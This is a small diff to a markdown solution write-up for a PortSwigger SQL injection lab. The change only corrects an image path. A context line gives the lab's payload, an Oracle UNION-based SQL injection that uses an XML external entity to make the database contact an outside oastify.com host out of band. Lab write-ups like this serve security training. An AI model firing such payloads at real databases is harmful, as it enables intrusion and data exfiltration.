@@ -15,6 +15,6 @@ To solve the lab, exploit the [SQL injection](https://portswigger.net/web-secur
 
 ### Lab solution
 
-![](static//img/Paste_image_20230605114828.png)
+![](/static/img/Pasted_image_20230605114828.png)
 
 - Payload: `' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://aaaaa.oastify.com/"> %remote;]>'),'/l') FROM dual--`
